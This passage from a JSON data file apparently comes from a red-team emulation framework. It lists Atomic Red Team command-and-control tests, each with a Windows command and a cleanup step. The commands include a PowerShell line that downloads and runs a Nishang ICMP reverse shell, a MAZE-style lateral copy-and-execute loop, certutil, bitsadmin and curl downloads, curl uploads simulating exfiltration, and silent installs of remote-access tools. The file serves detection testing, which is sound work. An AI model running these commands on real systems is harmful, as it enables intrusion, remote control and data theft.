                    "cleanup": "del %TEMP%\\redcanary.cab >nul 2>&1",
                    "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0dd1e1d2b1c626c431f486861904b069",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e6715e61f5df646692c624b3499384c4": {
        "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\T1105.txt >nul 2>&1 && del C:\\\\svchost.exe >nul 2>&1",
                    "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe && C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6715e61f5df646692c624b3499384c4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "810cb98b4ed5b3a026e48ffa35fef7e7": {
        "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore",
                    "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "810cb98b4ed5b3a026e48ffa35fef7e7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c9f7fc4ddd374ede126a78bff283fa4d": {
        "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "pushd \\\\localhost\\C$ && echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js && CScript.exe AtomicTestT1105.js //E:JScript && del AtomicTestT1105.js /Q >nul 2>&1 && del AtomicTestFileT1105.js /Q >nul 2>&1 && popd",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c9f7fc4ddd374ede126a78bff283fa4d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bbdf2a5aa91d944ad2f018a14a02dcff": {
        "description": "Use certreq to download a file from the web",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\Atomic-license.txt >nul 2>&1",
                    "command": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bbdf2a5aa91d944ad2f018a14a02dcff",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "14e7d26a5b4616007bd9de30a3a25972": {
        "description": "Use nimgrab.exe to download a file from the web. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del $env:TEMP\\Atomic-license.txt >nul 2>&1",
                    "command": "cmd /c nimgrab.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "14e7d26a5b4616007bd9de30a3a25972",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4f683658f161ccdc51337c470d32bab9": {
        "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\Atomic-license.txt -Force -ErrorAction Ignore",
                    "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4f683658f161ccdc51337c470d32bab9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8438857e1f82a71fbc9822602238b653": {
        "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if (test-path \"$env:temp\\T1105CompletedHosts.txt\") ; {foreach ($machine in get-content -path \"$env:temp\\T1105CompletedHosts.txt\"); {wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null; Remove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}; Remove-Item -path \"$env:temp\\T1105OfflineHosts.txt\" -erroraction silentlycontinue; Remove-item -path \"$env:temp\\T1105CompletedHosts.txt\" -erroraction silentlycontinue",
                    "command": "$machine_list = \"$env:temp\\T1105MachineList.txt\"; $offline_list = \"$env:temp\\T1105OfflineHosts.txt\"; $completed_list = \"$env:temp\\T1105CompletedHosts.txt\"; foreach ($machine in get-content -path \"$machine_list\"); {if (test-connection -Count 1 -computername $machine -quiet) ; {cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"; echo $machine >> \"$completed_list\"; wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}; else; {echo $machine >> \"$offline_list\"}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8438857e1f82a71fbc9822602238b653",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "36d84793f28c1eddb0d2cfb8639c4759": {
        "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "36d84793f28c1eddb0d2cfb8639c4759",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f50ec080343f1bec4e739dd20675c349": {
        "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'; if(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Remove-Item $file1 -ErrorAction Ignore | Out-Null",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Start-Process -Wait $file1 /S; Start-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f50ec080343f1bec4e739dd20675c349",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a10864b969f046cb33ee9e4bb2cc1942": {
        "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a10864b969f046cb33ee9e4bb2cc1942",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f10e7bf9333135cc84a1924dcd61d152": {
        "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1571",
            "name": "Non-Standard Port"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Test-NetConnection -ComputerName google.com -port 8081",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f10e7bf9333135cc84a1924dcd61d152",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ba343199a4f15ed6b57eb52412f62e4e": {
        "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1090.001",
            "name": "Proxy: Internal Proxy"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null",
                    "command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ba343199a4f15ed6b57eb52412f62e4e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7dabcbecab0334b115feefab1630f84a": {
        "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe.exe\"; Remove-Item $file1 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Start-Process $file1 /S; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7dabcbecab0334b115feefab1630f84a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "610cbe2e7f3962979292ccdb9e514306": {
        "description": "Create a ZIP file from a folder in a remote drive\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\PrintBrm.zip >nul 2>&1",
                    "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1  && C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "610cbe2e7f3962979292ccdb9e514306",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ee159de1f33eef7a5d6eb0bb53240baf": {
        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ee159de1f33eef7a5d6eb0bb53240baf",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f58d6c18ad6a30a73499c4b256b846ff": {
        "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1095",
            "name": "Non-Application Layer Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f58d6c18ad6a30a73499c4b256b846ff",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "40175f79973e19ca87854cbd01a71554": {
        "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location PathToAtomicsFolder; .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "40175f79973e19ca87854cbd01a71554",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1ad48fa96016dc9033ba07c919d7dbd7": {
        "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue",
                    "command": "Start-Process $env:temp\\ammyy.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ad48fa96016dc9033ba07c919d7dbd7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f1b3fca18d7465cd10e5a7477a3bf97d": {
        "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package ; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Remove-Item $file1 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f1b3fca18d7465cd10e5a7477a3bf97d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e9a6c8dc943d42f0ca52c1f25735ae80": {
        "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue",
                    "command": "Start-Process -Wait -FilePath \"$env:temp\\T1219Setup.exe\" -Argument \"/silent\" -PassThru; Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e9a6c8dc943d42f0ca52c1f25735ae80",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1095434782a00c8a4772a11e625bcf5d": {
        "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "finger base64_filedata@localhost",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1095434782a00c8a4772a11e625bcf5d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9332aff267b00ede37b09606340ee1dc": {
        "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; msiexec /x $installer /qn",
                    "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"; msiexec /i $installer /qn",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9332aff267b00ede37b09606340ee1dc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0d3d2fc5ad58e805a83edc76b45db3b5": {
        "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1071.004",
            "name": "Application Layer Protocol: DNS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location PathToAtomicsFolder; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0d3d2fc5ad58e805a83edc76b45db3b5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f4491df17637c686f9d5507780b217a5": {
        "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "for($i=0; $i -le",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f4491df17637c686f9d5507780b217a5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "af8cb2bf9b436aae5c106a0a9c207e14": {
        "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"; $file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"; Start-Process $file1 /S; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "af8cb2bf9b436aae5c106a0a9c207e14",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c6c559dbecc0305d0b0ac551d0b345cb": {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1572",
            "name": "Protocol Tunneling"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-Location PathToAtomicsFolder; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c6c559dbecc0305d0b0ac551d0b345cb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4424be28d098a0d95338a60c10a177c6": {
        "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /f/s/q %temp%\\T1105 >nul 2>&1 && rmdir /s/q %temp%\\T1105 >nul 2>&1",
                    "command": "821ca9_T1105.bat 1>NUL",
                    "payloads": [
                        "821ca9_T1105.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4424be28d098a0d95338a60c10a177c6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c521e0a70b243a0cf9217907ca3c6d27": {
        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1 && del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1 && del c:\\programdata\\allthethingsx64.dll >nul 2>&1 && del %Temp%\\allthethingsx64.dll >nul 2>&1",
                    "command": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c521e0a70b243a0cf9217907ca3c6d27",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c76968acda4aa1673dadcd67f3ab7664": {
        "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
